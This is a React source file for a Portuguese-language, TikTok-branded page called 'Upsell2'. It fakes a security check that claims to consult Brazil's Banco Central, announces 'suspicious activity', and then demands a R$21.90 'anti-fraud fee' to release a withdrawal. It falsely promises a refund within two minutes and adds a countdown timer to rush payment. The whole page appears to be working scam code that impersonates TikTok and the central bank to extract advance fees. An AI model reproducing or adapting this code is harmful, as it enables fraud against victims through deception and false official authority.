import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Search, AlertTriangle, Lock, Shield, Check, CreditCard, Clock } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";
const UPSELL2_TAX = 21.90;

type Screen = "verification" | "problem" | "main";

const verificationSteps = [
  "Verificando dados da conta",
  "Validando informações pessoais",
  "Conectando com sistema bancário",
  "Consultando Banco Central",
];

const Upsell2 = () => {
  const [screen, setScreen] = useState<Screen>("verification");
  const [visibleSteps, setVisibleSteps] = useState(0);
  const [countdown, setCountdown] = useState(4 * 60);
  const navigate = useNavigate();

  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "upsell2", content_type: "security_validation" } });

    // Step reveals
    const timers = verificationSteps.map((_, i) =>
      setTimeout(() => setVisibleSteps(i + 1), 1500 * (i + 1))
    );

    // Show problem screen at 7.5s
    const problemTimer = setTimeout(() => setScreen("problem"), 7500);

    // Show main screen at 9.5s
    const mainTimer = setTimeout(() => setScreen("main"), 9500);

    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(problemTimer);
      clearTimeout(mainTimer);
    };
  }, []);

  // Countdown only when main screen
  useEffect(() => {
    if (screen !== "main") return;
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [screen]);

  const mins = String(Math.floor(countdown / 60)).padStart(2, "0");
  const secs = String(countdown % 60).padStart(2, "0");

  const handlePagar = () => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { page: "upsell2", value: UPSELL2_TAX } });
    navigate("/pagamento");
  };

  return (
    <div style={{ fontFamily: FONT, background: "#fff", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{ width: "100%", background: "#fff", padding: "16px 0", borderBottom: "1px solid #f0f0f0", display: "flex", justifyContent: "center", position: "sticky", top: 0, zIndex: 100 }}>
        <img src={tiktokLogo} alt="TikTok" style={{ height: 24 }} loading="lazy" decoding="async" />
      </div>

      <div style={{ maxWidth: 375, margin: "0 auto", width: "100%", flex: 1 }}>

        {/* ─── Tela 1: Verificação ─── */}
        {screen === "verification" && (
          <div style={{ padding: "60px 24px", textAlign: "center", minHeight: "70vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
            <div style={{
              width: 80, height: 80,
              background: "linear-gradient(135deg, #00c853, #00e676)",
              borderRadius: "50%",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 24px",
              animation: "pulse 2s infinite",
            }}>
              <Search size={32} color="#fff" />
            </div>

            <p style={{ fontSize: 16, color: "#666", fontWeight: 500, marginBottom: 8 }}>
              Verificando segurança da transação
            </p>

            {/* Loading dots */}
            <div style={{ display: "flex", justifyContent: "center", gap: 6, margin: "20px 0" }}>
              {[0, 1, 2].map((i) => (
                <div
                  key={i}
                  style={{
                    width: 8, height: 8, borderRadius: "50%", background: "#ff0050",
                    animation: `dotPulse 1.4s infinite ease-in-out`,
                    animationDelay: `${-0.32 + i * 0.16}s`,
                  }}
                />
              ))}
            </div>

            {/* Steps */}
            {verificationSteps.map((step, i) => (
              <p
                key={i}
                style={{
                  fontSize: 14, color: "#888", marginBottom: 4,
                  opacity: i < visibleSteps ? 1 : 0,
                  transition: "opacity 0.5s ease",
                }}
              >
                ✓ {step}
              </p>
            ))}
          </div>
        )}

        {/* ─── Tela 2: Problema Detectado ─── */}
        {screen === "problem" && (
          <div style={{ padding: "60px 24px", textAlign: "center", minHeight: "70vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
            <div style={{
              width: 80, height: 80,
              background: "linear-gradient(135deg, #ff0050, #ff2a6d)",
              borderRadius: "50%",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 24px",
            }}>
              <AlertTriangle size={32} color="#fff" />
            </div>

            <p style={{ fontSize: 16, color: "#ff0050", fontWeight: 600, marginBottom: 12 }}>
              Problema Detectado
            </p>
            <p style={{ fontSize: 14, color: "#666", lineHeight: 1.5 }}>
              Foi identificada uma atividade suspeita em sua transação. É necessária uma validação adicional de segurança para continuar.
            </p>
          </div>
        )}

        {/* ─── Tela 3: Validação de Segurança ─── */}
        {screen === "main" && (
          <>
            {/* Status */}
            <div style={{ padding: "32px 24px 24px", textAlign: "center" }}>
              <div style={{
                width: 64, height: 64,
                background: "linear-gradient(135deg, #ff0050, #ff2a6d)",
                borderRadius: "50%",
                display: "flex", alignItems: "center", justifyContent: "center",
                margin: "0 auto 20px",
              }}>
                <Lock size={24} color="#fff" />
              </div>
              <h1 style={{ color: "#000", fontSize: 20, fontWeight: 700, marginBottom: 12, letterSpacing: "-0.3px" }}>
                Validação de Segurança
              </h1>
              <p style={{ fontSize: 15, color: "#666", lineHeight: 1.5 }}>
                Seu saque precisa de verificação adicional
              </p>
            </div>

            {/* Alerta */}
            <div style={{ background: "#fff9fa", borderTop: "1px solid #ffebee", borderBottom: "1px solid #ffebee", padding: "20px 24px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, color: "#ff0050", fontSize: 16, fontWeight: 700, marginBottom: 12 }}>
                <AlertTriangle size={18} />
                Medida de Segurança
              </div>
              <p style={{ fontSize: 14, color: "#666", lineHeight: 1.5 }}>
                Devido ao aumento de tentativas de fraude, o <strong style={{ color: "#000", fontWeight: 600 }}>Banco Central</strong> exige uma validação de segurança. Esta taxa de <strong style={{ color: "#000", fontWeight: 600 }}>R$ {UPSELL2_TAX.toFixed(2).replace(".", ",")}</strong> será reembolsada em 2 minutos após o pagamento.
              </p>
            </div>

            {/* Fee card */}
            <div style={{ padding: 24 }}>
              <div style={{ background: "#f8f9fa", borderRadius: 12, padding: 20, textAlign: "center", border: "1px solid #e8e8e8" }}>
                <div style={{
                  display: "inline-flex", alignItems: "center", gap: 6,
                  background: "#ff0050", color: "#fff",
                  padding: "8px 12px", borderRadius: 16,
                  fontSize: 13, fontWeight: 700, marginBottom: 16,
                }}>
                  <Shield size={14} />
                  TAXA ANTI-FRAUDE
                </div>

                <p style={{ fontSize: 28, fontWeight: 800, color: "#ff0050", marginBottom: 8 }}>
                  R$ {UPSELL2_TAX.toFixed(2).replace(".", ",")}
                </p>
                <p style={{ fontSize: 14, color: "#666", marginBottom: 20 }}>
                  Valor reembolsável em 2 minutos
                </p>

                {/* Benefits */}
                <div style={{ display: "flex", flexDirection: "column", gap: 12, margin: "20px 0" }}>
                  {["Liberação imediata do saque", "Proteção garantida pelo BC", "Reembolso automático"].map((text) => (
                    <div key={text} style={{ display: "flex", alignItems: "center", gap: 12 }}>
                      <div style={{ width: 20, height: 20, background: "#00c853", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                        <Check size={10} color="#fff" strokeWidth={3} />
                      </div>
                      <span style={{ fontSize: 14, color: "#333", textAlign: "left" }}>{text}</span>
                    </div>
                  ))}
                </div>

                {/* CTA */}
                <button
                  onClick={handlePagar}
                  style={{
                    width: "100%", border: 0, borderRadius: 12,
                    padding: "16px 20px", fontSize: 16, fontWeight: 700,
                    cursor: "pointer", color: "#fff",
                    background: "linear-gradient(135deg, #00c853, #00e676)",
                    display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                    margin: "20px 0 0", fontFamily: FONT,
                  }}
                >
                  <CreditCard size={18} />
                  PAGAR E LIBERAR SAQUE
                </button>
              </div>
            </div>

            {/* Timer */}
            <div style={{ padding: "16px 24px 24px", borderTop: "1px solid #f0f0f0" }}>
              <p style={{ textAlign: "center", fontSize: 13, color: "#666", fontWeight: 500, display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
                <Clock size={14} />
                Validação disponível por: <span style={{ color: "#ff0050", fontWeight: 700 }}>{mins}:{secs}</span>
              </p>
            </div>

            {/* Footer */}
            <p style={{ textAlign: "center", fontSize: 12, color: "#888", lineHeight: 1.4, padding: "0 24px 24px" }}>
              Esta validação é necessária para conclusão segura da transferência conforme exigido pelo Banco Central.
            </p>
          </>
        )}
      </div>

      {/* CSS Animations */}
      <style>{`
        @keyframes pulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.05); }
          100% { transform: scale(1); }
        }
        @keyframes dotPulse {
          0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
          40% { transform: scale(1); opacity: 1; }
        }
      `}</style>
    </div>
  );
};

export default Upsell2;
